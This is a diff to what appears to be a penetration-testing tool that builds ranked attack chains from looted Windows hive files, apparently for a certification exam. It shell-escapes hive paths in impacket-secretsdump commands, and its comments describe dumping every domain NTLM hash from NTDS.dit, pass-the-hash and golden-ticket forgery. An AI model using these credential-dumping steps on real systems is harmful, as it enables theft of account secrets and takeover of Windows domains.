@@ -1840,16 +1840,17 @@ def run(report, store, ui=None):
     # the operator can now paste from wherever their CWD is instead of
     # having to cd into the loot dir first.
     for d, hives in e.sam_dirs.items():
-        _sam = os.path.join(d, "SAM")
-        _sys = os.path.join(d, "SYSTEM")
-        _sec = os.path.join(d, "SECURITY")
-        _ntds = os.path.join(d, "NTDS.dit")
+        # iter-148: shell-escape hive paths for parity with iter-146/147.
+        _sam = _sh_sq(os.path.join(d, "SAM"))
+        _sys = _sh_sq(os.path.join(d, "SYSTEM"))
+        _sec = _sh_sq(os.path.join(d, "SECURITY"))
+        _ntds = _sh_sq(os.path.join(d, "NTDS.dit"))
         if {"sam", "system"} <= hives:
             chains.append(Chain("R3T", "dump SAM", "SAM+SYSTEM -> local NT hashes (PtH against ORIGINATING host with --local-auth, NOT the DC)",
                 crit=7, conf=0.9, ready=1.5, prox=0.7,        # score 6.62
                 commands=[f"impacket-secretsdump -sam '{_sam}' -system '{_sys}'" +
                           (f" -security '{_sec}'" if "security" in hives else "") + " LOCAL"],
-                src=_sam))
+                src=os.path.join(d, "SAM")))
         # iter-21: NTDS.dit + SYSTEM = offline DCSync (R3D).
         # Highest-yield AD chain - dumps EVERY domain account NTLM hash
         # without touching the network, fully exam-legal.
@@ -1864,7 +1865,7 @@ def run(report, store, ui=None):
                     f"# krbtgt hash in output -> R-GOLDEN (forge Administrator "
                     f"TGT); every user hash -> R7 (PtH)",
                 ],
-                src=_ntds))
+                src=os.path.join(d, "NTDS.dit")))
 
     # ── dedup identical chains across files (keep best score, sum counts) ──
     by_key = {}
